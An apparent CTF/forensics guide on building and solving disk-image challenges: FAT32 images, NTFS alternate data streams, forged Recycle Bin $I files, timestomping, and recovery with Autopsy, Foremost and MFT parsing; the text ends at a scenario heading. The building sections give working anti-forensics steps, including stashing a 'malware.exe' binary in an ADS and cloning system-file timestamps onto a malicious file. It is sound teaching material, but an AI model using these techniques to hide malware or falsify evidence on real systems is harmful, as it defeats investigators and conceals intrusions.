**Perspective: The Architect**

The standard workflow is to create a blank file, format it as a file system, mount it, populate it with evidence (and anti-forensics), and then finalize it as a disk image.

**Prerequisites:** Linux environment (Ubuntu/Kali/Arch).

Step 1: Create a "Blank" Raw Disk

Use dd to allocate a zero-filled file. This acts as our virtual hard drive.

Bash

```
# Create a 100MB blank file named 'challenge.raw'
# bs (block size) = 1M, count = 100
dd if=/dev/zero of=challenge.raw bs=1M count=100
```

Step 2: Format the Disk

Assign a file system (e.g., FAT32 is common for USB scenarios, EXT4 for Linux servers).

Bash

```
# Format as FAT32
mkfs.vfat challenge.raw
```

Step 3: Mount and Populate

Mount the raw file as a loopback device to interact with it like a normal folder.

Bash

```
# Create a mount point
mkdir /mnt/ctf_challenge

# Mount the raw image
sudo mount -o loop challenge.raw /mnt/ctf_challenge

# --- PLANTING THE FLAGS ---
cd /mnt/ctf_challenge

# 1. Normal File (easy)
echo "Part 1 of flag: CTF{simp" > documents.txt

# 2. Deleted File (medium)
# Write data, sync to disk, then delete it. 
# The data remains in unallocated space until overwritten.
echo "Part 2 of flag: l3_file_r3c" > secret.txt
sync
rm secret.txt

# 3. Hidden in Directory Entry (advanced - for FAT32)
# (Requires hex editing later, but standard file ops go here)
touch innocent_image.jpg
```

Step 4: Finalize and Convert to E01

Unmount the image. It is now a valid Raw (DD) image. If you want to provide an E01 file to simulate a professional evidence acquisition, use ewf-tools.

Bash

```
# Unmount first!
sudo umount /mnt/ctf_challenge

# Install tools if needed: sudo apt install ewf-tools

# Convert Raw to E01
# -t: target file (without extension)
# -f: format (encase6 is standard E01)
# -c: compression level (fast or best)
# -S: segment file size (to avoid splitting small CTF files)
ewfacquire -t challenge_dist -f encase6 -c fast -S 2GB challenge.raw

# The tool will ask for metadata (Case number, Examiner name).
# Enter details relevant to your scenario lore.
```

**Output:** You now have `challenge_dist.E01` to distribute to players.

#### 3. Example Scenario

Title: The Whistleblower's USB

Scenario: A disgruntled employee was seen plugging a USB drive into the secure server, copying a file, and then deleting it to cover their tracks. They dropped the USB drive in the parking lot.

The Artifact: A 64MB E01 image of a FAT32 formatted USB drive.

The Solution Path:

1. Player loads `usb.E01` into Autopsy or FTK Imager.
    
2. Browsing the "Active" files reveals nothing of interest.
    
3. Browsing the "Deleted" files (Carving) reveals `payroll_db.csv`.
    
4. The flag is located within the hex contents of the recovered deleted file.
    

#### 4. Key Tools

- **dd:** (Linux CLI) The fundamental tool for creating bit-stream copies. Used to generate the initial "canvas" for the challenge.
    
- **ewf-tools (ewfacquire):** (Linux CLI) Essential for converting raw images into the forensic standard E01 format with metadata.
    
- **FTK Imager:** (Windows/GUI) Can mount, create, and convert disk images. useful if you prefer building challenges in a Windows environment.

---

### Hiding data in Alternate Data Streams (ADS) on Windows

#### 1. Technical Theory

Alternate Data Streams (ADS) are a feature of the **NTFS** (New Technology File System) used by Windows. In NTFS, a "file" is essentially a record in the Master File Table (MFT). This record contains attributes, one of which is the `$DATA` attribute, containing the actual file content.

- **Standard Stream:** The default content we see in Explorer is the "unnamed" `$DATA` stream.
    
- **Alternate Stream:** NTFS allows multiple `$DATA` attributes for a single MFT record. These additional streams have names and can store text, images, or even executable code.
    
- **Key Constraints:**
    
    - ADS are **invisible** to standard Windows Explorer (File Size and "Modified Date" usually reflect only the primary stream).
        
    - ADS data is **lost** if the file is copied to a non-NTFS file system (like FAT32 USB drives) or uploaded to most cloud storage without zipping.
        

#### 2. Practical Implementation (The Architect)

To create this challenge, you need a Windows environment. You can create ADS using native Command Prompt, PowerShell, or Python.

Method 1: Native Command Line (Simple Text Hiding)

This is the fastest way to create a basic flag challenge.

DOS

```
:: Create a legitimate looking carrier file
echo "This is just a standard log file. Nothing to see here." > database.log

:: Inject the flag into a hidden stream named 'secret'
echo "FLAG{ntfs_attribut3s_ar3_fun}" > database.log:secret

:: Verify creation (Standard 'dir' will NOT show the change)
dir database.log

:: To verify as the architect, use PowerShell or 'dir /r'
dir /r database.log
```

Method 2: Hiding Executables/Binaries

You can hide a complete binary (like a reverse shell or a malware stage) inside a text file.

DOS

```
:: Assume you have a binary 'malware.exe' and a carrier 'readme.txt'
:: Redirect the binary content into an alternate stream of the text file
type malware.exe > readme.txt:malware.exe

:: The 'malware.exe' can now be deleted. The code resides inside readme.txt.
del malware.exe
```

_Note for CTF Design:_ Running an executable directly from an ADS (`wmic process call create`) is restricted in modern Windows Defender environments. For a CTF, usually, the challenge is just to _extract_ the binary, not necessarily execute it directly from the stream.

Method 3: Python Automation (Bulk/Scripted Creation)

If you need to generate these programmatically for a dynamic CTF environment:

Python

```
import os

def create_ads_challenge(carrier_file, stream_name, hidden_data):
    """
    Creates an NTFS Alternate Data Stream.
    OS: Windows Only.
    """
    # Ensure the carrier file exists
    if not os.path.exists(carrier_file):
        with open(carrier_file, 'w') as f:
            f.write("Standard file content.")

    # The syntax for ADS is filename:streamname
    full_path = f"{carrier_file}:{stream_name}"
    
    try:
        # Write to the stream just like a normal file
        with open(full_path, 'w') as f:
            f.write(hidden_data)
        print(f"[+] Successfully hid data in {full_path}")
    except OSError:
        print("[-] Error: This script must be run on a Windows NTFS drive.")

# Execution
create_ads_challenge("system_info.txt", "hidden_flag", "FLAG{stream_hunteR}")
```

#### 3. Example Scenario

Scenario Name: "The Empty Safe"

Description: Participants are given a forensic image of a Windows User folder. They find a folder named TopSecret containing a single file: passwords.txt.

The Twist:

1. When opened, `passwords.txt` is 0 bytes (empty).
    
2. However, the file takes up 4KB on disk (allocated size), hinting at hidden attributes.
    
3. The flag is not in the file content, but hidden in an ADS named `passwords.txt:archive`.
    
4. Furthermore, the stream contains a PNG header. The solver must extract the stream `passwords.txt:archive` and rename it to `.png` to view the image of the flag.
    

#### 4. Key Tools

- **Command Prompt (`type`, `echo`):** The native and most reliable way to push data into streams.
    
- **PowerShell (`Set-Content`):** Allows specific manipulation of streams using the `-Stream` flag.
    
- **`streams.exe` (Sysinternals):** While primarily an analysis tool, an Architect can use `streams -d` to delete streams quickly if they make a mistake during challenge creation.

---

### Simulating file deletion and recycle bin activity

#### 1. Technical Theory

When a user "deletes" a file in Windows (sending it to the Recycle Bin), the OS does not immediately destroy the data. Instead, it performs a **move** operation to a hidden system directory located at `C:\$Recycle.Bin\<User_SID>\`.

During this process, the original file is renamed and split into two paired artifacts:

1. **The $R File (`$R\<RandomString\>.ext\`):** This contains the actual raw data/content of the deleted file.
    
2. **The $I File (`$I\<RandomString\>.ext\`):** A metadata index file containing the original file path, the file size, and the **deletion timestamp**.
    

If a file is "permanently deleted" (Shift+Delete), it bypasses the Recycle Bin. In the Master File Table (MFT), the file's entry flag is switched from "Allocated" to "Unallocated," identifying the disk clusters as available for overwriting, though the data remains until actually overwritten.

#### 2. Practical Implementation (The "How-To")

Method A: Manual Recycle Bin Artifact Creation (The "Forger")

To create a CTF challenge where the timeline is critical (e.g., "The suspect deleted the evidence at exactly 12:00:00"), you cannot rely on the OS system clock. You must forge the $I file.

**Python Script: Generating Custom $I Files (Windows 10/11 Format)**

This script generates a Version 2 $I\ file with a specific deletion timestamp and original path.

Python

```
import struct
import datetime
import os

def get_windows_filetime(dt):
    """Converts Python datetime to Windows FILETIME (100ns intervals since 1601)."""
    epoch = datetime.datetime(1601, 1, 1, 0, 0, 0)
    delta = dt - epoch
    # Convert to microseconds, then to 100ns intervals (x10)
    return int(delta.total_seconds() * 1000000 * 10)

def create_i_file(output_name, original_path, file_size_bytes, deletion_time):
    """
    Creates a Windows 10/11 style $I file (Version 2 header).
    Structure:
    [0-7]   Version (02 00 00 00 00 00 00 00)
    [8-15]  Original Size (Int64)
    [16-23] Deletion Timestamp (Int64 FILETIME)
    [24-27] Path Length (Int32 - Count of characters)
    [28+]   Original Path (UTF-16LE)
    """
    
    # Header for Windows 10/11 ($I Version 2)
    version = b'\x02\x00\x00\x00\x00\x00\x00\x00'
    
    # Encode path to UTF-16LE
    encoded_path = original_path.encode('utf-16le') + b'\x00\x00' # Null terminator
    path_len = len(original_path) + 1 # Include null in length count
    
    timestamp = get_windows_filetime(deletion_time)

    # Pack the binary data
    # < = Little Endian, Q = Unsigned Long Long (8 bytes), L = Unsigned Long (4 bytes)
    data = (
        version + 
        struct.pack('<Q', file_size_bytes) +
        struct.pack('<Q', timestamp) +
        struct.pack('<L', path_len) +
        encoded_path
    )

    with open(output_name, 'wb') as f:
        f.write(data)
        
    print(f"[+] Created forged metadata file: {output_name}")
    print(f"[+] Deletion Time set to: {deletion_time}")

# --- Configuration ---
# The "Original" file path the investigator will see
target_path = r"C:\Users\Admin\Documents\Secret_Plans.pdf"
# The simulated size of the file
size = 10240 
# The fake time of deletion
fake_time = datetime.datetime(2025, 11, 5, 14, 30, 0)

# Generate the artifact
# In a CTF, you would rename the actual PDF to $R123456.pdf 
# and name this output $I123456.pdf
create_i_file("$I123456.pdf", target_path, size, fake_time)
```

Method B: Simulating Unallocated Space (Shift+Delete)

To create a challenge where a file must be carved from "deleted" space:

1. **Create a Disk Image:** Use `dd` or `VeraCrypt` to create a small container file.
    
2. **Mount** the container.
    
3. **Copy** the flag file (e.g., `flag.png`) onto the mounted drive.
    
4. **Delete** the file (ensure it bypasses Recycle Bin).
    
5. **Unmount** the drive.
    
    - _Result:_ The binary data of `flag.png` exists on the disk image, but the file system table lists that space as free. The investigator must use tools like `photorec` or `sleuthkit` to recover it.
        

#### 3. Example Scenario

Scenario Name: "The Panic Button"

The Setup: An employee was accused of corporate espionage. Security logs show they logged off at 09:00 AM.

The Artifact: A USB drive image containing a $Recycle.Bin folder.

The Twist: Inside the bin, there is a $R file (an incriminating spreadsheet) and a corresponding $I file.

The Challenge: The $I file data shows the deletion timestamp was 09:15 AM. This contradicts the logoff time, suggesting either the logs were altered, or someone else had access to the machine (or the Architect manipulated the timestamp to create a timeline discrepancy puzzle).

The Flag: The flag is the MD5 hash of the deleted file combined with the exact deletion timestamp string.

#### 4. Key Tools

- **RBCmd (Zimmerman Tools):** The industry standard for parsing `$I` files to verify your forged artifacts are structurally correct.
    
- **HxD:** For manually corrupting MFT headers or modifying `$I` files byte-by-byte if specific corruption signatures are required.
    
- **FTK Imager:** To mount virtual disk images and manage the "deletion" of files within a controlled container environment.

---

### "Timestomping" (manipulating file creation/access timestamps)

#### 1. Technical Theory

Timestomping is an anti-forensics technique used to modify the timestamps of a file to hide it among legitimate system files or to place it outside a specific timeframe investigated by forensic analysts.

In the context of the **NTFS file system** (Windows), every file has two sets of timestamps stored in the Master File Table (MFT):

1. **$STANDARD_INFORMATION (0x10):** The timestamps viewed by standard tools (Explorer, cmd, PowerShell). These are easily modifiable by user-level API calls.
    
2. **$FILE_NAME (0x30):** The timestamps stored within the filename attribute record. These are updated by the OS kernel and are much harder to modify without direct disk manipulation or kernel-level access.
    

**Key Constraints:** A "lazy" timestomp (using standard APIs) creates a discrepancy between the `$SI` and `$FN` attributes. This mismatch is exactly what investigators look for to identify manipulated files.

#### 2. Practical Implementation (The "How-To")

To create a CTF challenge, you will use methods that modify the visible timestamps ($Standard_Information) to mimic a legitimate file, while intentionally leaving the $FILE_NAME timestamps alone (or modifying them imperfectly) to allow for detection.

Method A: Windows PowerShell (The "Lazy" Stomp)

This method modifies the Created, Accessed, and Written times. This is perfect for creating a challenge where the solution involves detecting the mismatch between $SI and $FN attributes.

PowerShell

```
# 1. Create the payload file
New-Item -Path "C:\Temp\malware.exe" -ItemType File

# 2. define the target timestamp (e.g., mimic a system update from 2020)
$targetDate = Get-Date -Year 2020 -Month 05 -Day 12 -Hour 10 -Minute 30 -Second 00

# 3. Apply the timestamps to the file
$file = Get-Item "C:\Temp\malware.exe"
$file.CreationTime = $targetDate
$file.LastWriteTime = $targetDate
$file.LastAccessTime = $targetDate

# Verification: viewing properties in Windows Explorer will now show 2020.
Write-Host "File timestomped to: $targetDate"
```

Method B: Cloning Timestamps (Python Script)

This script copies the timestamps from a trusted system file (like cmd.exe) and applies them to your flag/malware file. This makes the file blend in perfectly during a visual inspection of the directory.

Python

```
import os
import shutil
import time
from datetime import datetime

def clone_timestamps(source_file, target_file):
    try:
        # Get stats from the source (clean) file
        source_stat = os.stat(source_file)
        
        # os.utime takes (atime, mtime)
        # This modifies the Access and Modification times
        os.utime(target_file, (source_stat.st_atime, source_stat.st_mtime))
        
        print(f"[+] Successfully cloned timestamps from {source_file} to {target_file}")
        print(f"    Target Access Time: {datetime.fromtimestamp(source_stat.st_atime)}")
        print(f"    Target Modify Time: {datetime.fromtimestamp(source_stat.st_mtime)}")
        
    except FileNotFoundError:
        print("[-] Error: File not found.")
    except PermissionError:
        print("[-] Error: Insufficient permissions. Try running as Administrator.")

# Usage Example
# Windows: Clone legitimate notepad.exe times to the malicious file
source = r"C:\Windows\System32\notepad.exe"
target = r"C:\CTF_Challenges\suspicious_artifact.exe"

# Ensure target exists for the example
if not os.path.exists(target):
    with open(target, 'w') as f:
        f.write("Malicious Payload")

clone_timestamps(source, target)
```

Method C: Linux "Touch" (Epoch Manipulation)

For Linux-based challenges, touch is the standard tool.

Bash

```
# Set the timestamp to January 1st, 2000 at 12:00 PM
# Format: [[CC]YY]MMDDhhmm[.ss]
touch -t 200001011200 flag.txt

# Verify
ls -l --full-time flag.txt
```

#### 3. Example Scenario

**Scenario Title:** "The Time Traveler"

Description:

"We detected a breach on the server. The attacker managed to upload a PHP shell, but they were smart—they timestomped the file to match the OS installation date (2018) so our timeline analysis script missed it. However, they only used user-level APIs."

**The Setup:**

1. You create `web_config_backup.php` (the flag).
    
2. You use **Method A (PowerShell)** to set its date to `2018-01-01 00:00:00`.
    
3. You place this file in a folder full of other files genuinely created in 2024.
    
4. **The Solve:** The investigator realizes the file claims to be from 2018 but was found in a folder created in 2024. They use a tool to parse the MFT and see that the `$FILE_NAME` creation time is actually `2024-11-21`, exposing the fraud.
    

#### 4. Key Tools

- **Metasploit (timestomp.rb):** A post-exploitation module that allows attackers to modify MACE values on a compromised host, including options to wipe them completely (set to 0).
    
- **NirSoft BulkFileChanger:** A standalone GUI utility for Windows that allows easy modification of Creation/Access/Modified times for lists of files.
    
- **SetMace:** A specialized tool often used to manually manipulate these attributes for testing forensic tools.
    
- **Touch:** Standard *nix utility for timestamp modification.

---

## The Investigator (Solution)

### Mounting and navigating forensic images (Autopsy, FTK Imager)

#### 1. Technical Theory

Forensic images (like `.E01` or `.dd`) are inert files containing a serialized stream of data. To analyze them, they must be interpreted by software that understands the file system structures (like the Master File Table in NTFS or Inodes in EXT4) embedded within that stream.

"Mounting" in a forensic context differs from standard OS mounting. Standard mounting allows the OS to read/write to the file system. Forensic mounting or "loading" ensures:

1. **Read-Only Access:** The integrity of the evidence is preserved; no metadata (like Last Access Time) is altered.
    
2. **Physical vs. Logical View:** Tools present the "Physical" view (raw hex sectors, unallocated space) alongside the "Logical" view (files and folders). This is critical because standard OS explorers cannot see deleted files residing in unallocated clusters.
    

**Key Constraints:**

- **Write-Blocking:** Software-based write blocking is inherent in tools like Autopsy. If mounting to a host OS (e.g., Windows Explorer) using tools like Arsenal, ensure the "Read Only" flag is checked.
    
- **Encryption:** If the image is BitLocker or LUKS encrypted, it cannot be navigated until the volume is decrypted with a recovery key or password.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

The goal is to traverse the file system, recover deleted items, and extract artifacts without altering the source.

A. Quick Analysis with FTK Imager (Windows)

FTK Imager is a lightweight tool perfect for "triage"—quickly browsing an image to see if the flag is in a plain file.

1. **Load Image:**
    
    - File > **Add Evidence Item**.
        
    - Select **Image File** > Browse to `challenge.E01` or `challenge.dd`.
        
2. **Navigation:**
    
    - Expand the "Evidence Tree" on the left pane.
        
    - **X mark:** Files with a red 'X' icon are **deleted files** that still exist in the Master File Table (MFT). FTK Imager allows you to browse these as if they were regular files.
        
    - **[root]:** This is the top of the file system.
        
    - **[unallocated space]:** Contains data not assigned to any active file. Flags are often hidden here in raw text.
        
3. **Hex Preview:**
    
    - Click any file to see its contents in the bottom-right pane.
        
    - If a file extension is fake (e.g., `flag.jpg` that is actually text), the Hex/Text view will reveal the true contents immediately.
        

B. Deep Analysis with Autopsy (Windows/Linux)

Autopsy is a full forensic suite. It runs "Ingest Modules" that automatically extract specific data types (web history, EXIF, keywords).

1. **Create Case:**
    
    - Open Autopsy > **New Case**.
        
    - Enter Case Name (e.g., "CTF_Challenge_1") and Base Directory.
        
2. **Add Data Source:**
    
    - Select **"Disk Image or VM File"**.
        
    - Browse to the image file.
        
    - _Time Zone Settings:_ For CTF, usually keep as "UTC" unless the prompt specifies otherwise.
        
3. **Configure Ingest Modules:**
    
    - For a standard CTF, ensure these are checked:
        
        - _Keyword Search:_ (Add the string "flag", "CTF", or typical headers like "PK" for zip).
            
        - _Extension Mismatch Detector:_ Flags files where the extension doesn't match the magic bytes (e.g., an EXE renamed to `.txt`).
            
        - _PhotoRec Carver:_ Attempts to recover deleted files from unallocated space based on headers.
            
4. **Analysis:**
    
    - **Views > File Types > By Extension:** Quickly find all images or documents, regardless of which folder they are in.
        
    - **Views > Deleted Files:** Aggregates all recoverable deleted content.
        

C. Linux CLI Mounting (The Manual Way)

If you are on Linux and need to run grep against the whole filesystem:

Bash

```
# 1. If it is an E01, mount the raw stream first
ewfmount evidence.E01 /mnt/raw_stream

# 2. Inspect the partition table to find the offset of the partition
# Look for the "Start" sector. Multiply by sector size (usually 512).
mmls /mnt/raw_stream/ewf1

# 3. Mount the partition (Assuming offset is 2048 sectors * 512 = 1048576 bytes)
sudo mount -o ro,loop,offset=1048576 /mnt/raw_stream/ewf1 /mnt/windows_mount

# 4. Now you can standard Linux tools
find /mnt/windows_mount -name "*flag*"
grep -r "CTF{" /mnt/windows_mount
```

#### 3. Example Scenario

Title: The Mismatched Extension

Scenario: You are given suspect_drive.dd. The briefing states the suspect downloaded a hacking tool but tried to hide it.

Analysis:

1. The investigator loads the image into **Autopsy**.
    
2. The "Extension Mismatch Detected" result appears on the dashboard.
    
3. It flags a file located at `/Users/John/Documents/resume.pdf`.
    
4. Viewing the file in the "Hex" tab reveals the magic bytes `MZ` (Windows Executable) instead of `%PDF`.
    
5. Exporting and running `strings` on this fake PDF reveals the flag in the binary strings.
    

#### 4. Key Tools

- **FTK Imager:** (Windows) Best for quick previewing, browsing file structures, and exporting files without waiting for a full index.
    
- **Autopsy:** (Windows/Linux/Mac) Best for automated processing, keyword searching across the entire disk, and file carving.
    
- **Arsenal Image Mounter:** (Windows) Allows you to mount an E01 image as a real Local Disk (e.g., Drive D:) in Windows, allowing you to use standard tools (like virus scanners or Explorer) on the image.

---

### File carving and recovery of deleted data (Foremost, Scalpel)

#### 1. Technical Theory

File carving is the process of reassembling computer files from raw data fragments in the absence of filesystem metadata. When a file is deleted or a drive is formatted, the filesystem (like NTFS or EXT4) marks the space as available, but the actual binary data usually remains on the disk until overwritten.

- **Mechanism:** Carvers scan the raw disk image byte-by-byte looking for specific **Magic Bytes** (File Signatures).
    
- **Start of File (SoF):** A specific hex sequence marking the beginning of a file format (e.g., `FF D8 FF` for JPEG).
    
- **End of File (EoF):** A specific sequence marking the end (e.g., `FF D9` for JPEG).
    
- **Key Constraints:**
    
    - **Fragmentation:** Standard carving assumes files are stored contiguously (in a row). If a file is fragmented (scattered across the disk), simple header/footer carving will fail or result in corrupted files.
        
    - **False Positives:** Random data often mimics headers, leading to "junk" files being recovered.
        

#### 2. Practical Implementation (The Investigator)

The two most prevalent CLI tools for this in CTFs are **Foremost** and **Scalpel**.

Option A: Using Foremost

Foremost is the classic tool originally developed by the US Air Force. It is simple to use and has many built-in signatures.

Bash

```
# Basic Usage
# -i: Input file (dd image or raw device)
# -o: Output directory (Must not exist, or use -T to timestamp it)
# -v: Verbose mode
foremost -i evidence.dd -o recovered_data -v

# Targeted Carving
# Only look for specific file types (e.g., png, jpg, pdf) to save time/space
foremost -t png,pdf -i evidence.dd -o recovered_docs
```

Option B: Using Scalpel

Scalpel is a fork of Foremost designed to be more efficient and lower memory usage. It is stricter and requires configuration before running.

1. Configuration:

Scalpel does not search for anything by default. You must edit its configuration file to tell it what to look for.

Bash

```
# 1. Copy the default config to your working directory
cp /etc/scalpel/scalpel.conf ./myscalpel.conf

# 2. Edit the file
nano myscalpel.conf

# 3. Locate the file types you need (e.g., 'jpg') and remove the '#' symbol 
#    at the start of the line to uncomment them.
#    Example line in config:
#    jpg     y       200000000       \xff\xd8\xff\xe0\x00\x10        \xff\xd9
```

2. Execution:

Once configured, run the tool pointing to your custom config.

Bash

```
# -c: Path to configuration file
# -o: Output directory (SAFETY CHECK: This directory MUST NOT exist beforehand)
scalpel -c myscalpel.conf -o scalpel_output evidence.dd
```

Carving Custom/Unknown File Types:

If a CTF involves a custom file format (e.g., a game save file with header GTAVSAVE), you can add a custom line to the configuration file of either tool:

extension case_sensitive max_size header_hex footer_hex

#### 3. Example Scenario

Scenario Name: "Format C:"

Description: A suspect realized the police were at the door and performed a "Quick Format" on their USB drive containing incriminating PDFs. The investigator receives a raw image usb_dump.img.

Analysis:

1. Mounting the image shows an empty drive because the File Allocation Table has been reset.
    
2. The investigator runs `foremost -t pdf -i usb_dump.img -o evidence`.
    
3. Foremost scans the raw hex. It finds the PDF magic bytes `%PDF-1.5` (Hex: `25 50 44 46`).
    
4. It extracts data starting from that header until it hits the PDF EOF marker (`%%EOF`).
    
5. The output folder contains `0001234.pdf`, which opens perfectly to reveal the flag.
    

#### 4. Key Tools

- **Foremost:** Best for quick, "fire and forget" recovery of standard file types.
    
- **Scalpel:** Best when granular control is needed or when Foremost crashes on large images.
    
- **Bulk Extractor:** While not a traditional carver (it doesn't reconstruct files based on size), it carves _features_ (emails, URLs, credit cards) from the raw stream, often finding data that file carvers miss due to fragmentation.

---

### Analyzing the Recycle Bin (\$R, \$I) and file system metadata ($LogFile, MFT).

#### 1. Technical Theory

When a file is moved to the Recycle Bin in Windows, its data is retained, but its location is obscured. The investigator's goal is to link the data file, the metadata index, and the file system records to reconstruct the original action and timeline.

- **Recycle Bin Artifacts:**
    
    - **$R File:** Contains the raw content of the deleted file, renamed with a unique ID (e.g., `$R12A3B4.doc\`).
        
    - **$I File:** The paired metadata index (e.g., `$I12A3B4.doc\`). This binary file, crucial for forensic analysis, holds the **original file path** and a **64-bit Windows FILETIME timestamp** representing the exact moment of deletion.
        
- **File System Metadata (NTFS):** When any file operation occurs (including deletion or moving to the Recycle Bin), the action is recorded:
    
    - **Master File Table (MFT):** The entry for the original file is updated, recording changes in attributes or a shift in the file's status (allocated to unallocated, or location change).
        
    - **$LogFile:** Contains transaction records that can confirm the integrity and sequence of file system actions, providing a valuable cross-reference for the Recycle Bin deletion timestamp.
        

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

The goal is to automatically locate, parse, and correlate the scattered Recycle Bin artifacts to reconstruct the original timeline and file properties.

A. Automated Recycle Bin Analysis (RBCmd)

RBCmd (Recycle Bin Command) is a specialized tool that automatically processes the complex binary structure of $I files and links them to the $R data files.

- **Execution Command:** Run the tool against the root of the `$Recycle.Bin` directory or the physical drive image.
    
    Bash
    
    ```
    # Run the tool on the mounted volume or the extracted $Recycle.Bin folder
    RBCmd.exe -d C:\$Recycle.Bin -csv "recycle_bin_output.csv"
    ```
    
- **Output Analysis:** The tool generates a CSV file with columns that defeat the Architect's attempts to hide data:
    
    - `Source File Name` (The forged original path from the `$I` file).
        
    - `Deleted On` (The parsed Windows FILETIME deletion timestamp).
        
    - `File Size` (The size from the `$I` file).
        

B. Manual Validation and Forgery Detection (Hex Editor)

If the automated tool fails or the deletion timestamp is suspiciously precise, manual verification of the $I file format is required.

- **Steps:**
    
    1. Open the `$I` file in a hex editor (e.g., HxD).
        
    2. Validate the first 8 bytes for the version number (e.g., `02 00 00 00 00 00 00 00` for Version 2/Windows 10/11).
        
    3. Locate the deletion timestamp (bytes **16-23**).
        
        ```
        # Hex Dump Snippet of $I file
        # Offset 00: Version (8 bytes)
        # Offset 08: File Size (8 bytes)
        # Offset 16: DELETION TIMESTAMP (8 bytes) <--- FOCUS HERE
        00000010: XX XX XX XX | YY YY YY YY  00 00 00 00 00 00 00 00 | 00 00 00 00
        # The 8 bytes starting at offset 16 contain the FILETIME value.
        ```
        
    4. Extract the 8-byte value (Little Endian) and use an online converter (or Python) to convert the **Windows FILETIME** to UTC datetime. This verifies the forged timestamp.
        

C. Cross-Correlation with File System Journals (NTFS LogFile)

For high-confidence analysis, compare the deletion timestamp against the NTFS change journal.

- **Tool:** Use a tool like **Sleuth Kit/Autopsy** or **LogFileParser** (from Zimmerman Tools) to parse the **$LogFile** and the **$J** (journal) file.
    
- **Corroboration:** Search the journal entries for the unique file ID of the original file (if known) or the approximate deletion timestamp. A legitimate file system deletion should correlate with a sequence of events in the MFT and the $LogFile indicating the file was moved and its entry updated.
    

#### 3. Example Scenario

Scenario Name: "The Timeline Anomaly"

The Setup: The evidence image contains a `$Recycle.Bin` entry for `classified.zip`. The investigator runs `RBCmd` and notes the deletion time is **2025-11-05 14:30:00 UTC**.

The Challenge: The system event logs show the user session ended at **14:20:00 UTC**. There is a 10-minute gap. The investigator suspects forgery to hide the true deletion time or the true user.

The Solution Path:

1. Verify the integrity of the deletion timestamp using a hex editor and a FILETIME converter to confirm the time **14:30:00** is indeed encoded at bytes 16-23 of the `$I` file.
    
2. Use **LogFileParser** to search the disk image's **$LogFile** for any transaction entries immediately following 14:20:00.
    
3. If the $LogFile shows no related activity, the timestamp in the **$I** file is the only evidence of the 14:30:00 event, confirming the Architect's deliberate forgery.
    
4. The flag is obtained by noting the difference, `10 minutes`, which is a key component of the flag submission (e.g., `flag{t1m3_d1scr3p4ncy_10m}`).
    

#### 4. Key Tools

- **RBCmd (Recycle Bin Cmd):** (Zimmerman Tools) The primary automated tool for extracting and exporting Recycle Bin metadata from $I$ files into a readable format.
    
    - _Tool Link:_ [https://ericzimmerman.github.io/#!index.md](https://ericzimmerman.github.io/#!index.md)
        
- **HxD / WinHex:** Used for low-level manual verification of the `$I` file structure, specifically for detecting or confirming forged timestamps at the byte level.
    
- **LogFileParser / JLECmd:** (Zimmerman Tools) Used to extract and analyze the NTFS metadata journals ($LogFile, $J) to cross-correlate deletion events and detect inconsistencies.

---

### Parsing MFT records and detecting ADS

#### 1. Technical Theory

The Master File Table (MFT) is the heart of the NTFS file system. Every file and directory on an NTFS volume has at least one entry (record) in the MFT, typically 1024 bytes in size.

- **MFT Record Structure:** Each record begins with a header (Magic Bytes: `FILE` or `46 49 4C 45`) followed by a list of **Attributes**.
    
- **Key Attributes:**
    
    - `$STANDARD_INFORMATION (0x10)`: Contains standard timestamps (Created, Modified, Access, MFT Changed) and permissions.
        
    - `$FILE_NAME (0x30)`: Contains the filename and its own set of timestamps (often used to detect "Timestomping").
        
    - `$DATA (0x80)`: Contains the actual file content.
        
- **Resident vs. Non-Resident:** If the file content is small (typically < 700 bytes), it is stored directly inside the `$DATA` attribute within the MFT record (**Resident**). If larger, the MFT record stores pointers (runlists) to the clusters on the disk where the data lives (**Non-Resident**).
    
- **Alternate Data Streams (ADS):** NTFS allows a file entry to have multiple `$DATA` attributes. The default, unnamed stream is what users see. Additional named streams (e.g., `file.txt:hidden`) are invisible to standard Windows Explorer but are stored in the same MFT record (or extension records).
    

#### 2. Practical Implementation (The "How-To")

Method A: Live Detection (PowerShell & CMD)

When investigating a live machine or a mounted image where the file system is interpreted by the OS.

- Command Line (CMD):
    
    The standard dir command hides ADS, but the /r flag reveals them.
    
    DOS
    
    ```
    dir /r C:\Suspect_Folder\
    ```
    
    _Output Look:_ `file.txt:secret_stream:$DATA`
    
- PowerShell (Scripting):
    
    PowerShell treats streams as items that can be iterated.
    
    PowerShell
    
    ```
    # Recursively find all files with alternate streams in the current directory
    Get-ChildItem -Recurse | Get-Item -Stream * | Where-Object { $_.Stream -ne ':$DATA' }
    ```
    

Method B: Dead Disk Analysis (Raw MFT Parsing)

When you only have a raw disk image (.dd, .e01) or an extracted $MFT file, you must parse the binary structures.

Python Script: MFT Header & Attribute Parser

This script reads a raw 1024-byte MFT record and identifies the start of the attribute chain.

Python

```
import struct
import sys

def parse_mft_record(record_bytes):
    """
    Parses the first 50 bytes of an NTFS MFT Record.
    """
    if len(record_bytes) != 1024:
        print("[-] Error: Input must be exactly 1024 bytes.")
        return

    # Unpack MFT Header
    # Signature (4s), UpdateSeqOffset (H), UpdateSeqSize (H), 
    # LogFileSeqNum (Q), SeqNum (H), HardLinkCount (H), AttributeOffset (H)
    try:
        header = struct.unpack('<4sHHQHHH', record_bytes[:22])
        signature = header[0]
        attr_offset = header[6]
        flags = struct.unpack('<H', record_bytes[22:24])[0]
        
        print(f"[*] Signature: {signature.decode('utf-8', errors='ignore')}")
        
        if signature != b'FILE':
            print("[-] Invalid MFT Record Signature")
            return

        print(f"[*] Flags: {flags} (0x01=InUse, 0x02=Directory)")
        print(f"[*] First Attribute Offset: {attr_offset}")

        # Basic Attribute Walker (Simplified)
        cursor = attr_offset
        while cursor < 1024:
            # Read Attribute Header (Type, Length)
            # Type is 4 bytes, Length is 4 bytes
            if cursor + 8 > 1024: break
            
            attr_type, attr_len = struct.unpack('<II', record_bytes[cursor:cursor+8])
            
            # End of attributes marker
            if attr_type == 0xFFFFFFFF:
                break
                
            print(f"    [+] Found Attribute: 0x{attr_type:X} (Length: {attr_len})")
            
            # Check for $DATA (0x80)
            if attr_type == 0x80:
                print("        -> $DATA Attribute found (Potential ADS if multiple exist)")
            
            if attr_len == 0: break 
            cursor += attr_len

    except Exception as e:
        print(f"[-] Parsing Error: {e}")

# Usage Context:
# In a CTF, you might extract the MFT using 'icat' or read it via 'dd'
# Example: reading the first record
# with open('$MFT', 'rb') as f:
#     data = f.read(1024)
#     parse_mft_record(data)
```

#### 3. Example Scenario

Scenario Name: "The Zone Identifier"

